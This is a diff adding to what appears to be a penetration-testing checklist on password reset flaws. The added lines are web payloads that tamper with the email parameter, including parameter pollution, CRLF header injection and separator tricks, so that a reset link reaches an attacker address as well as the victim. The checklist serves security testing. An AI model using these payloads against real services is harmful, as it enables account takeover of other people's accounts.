@@ -20,3 +20,21 @@
     > On Password Reset Page Click On Social Media Links Given Below And Capture The Request Using Burp Suite
     
     > Check if the referer header is a leaking password reset token?
+
+- Password reset with manipulating email parameter
+    
+    > email=victim@xyz.tld&email=hacker@xyz.tld
+       
+    > email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
+        
+    > email=victim@xyz.tld,hacker@xyz.tld
+    
+    > email=victim@xyz.tld%20hacker@xyz.tld
+    
+    > email=victim@xyz.tld|hacker@xyz.tld
+    
+    > email=victim
+    
+    > email=victim@xyz
+    
+    > {“email”:[“victim@xyz.tld”,”hacker@xyz.tld”]}
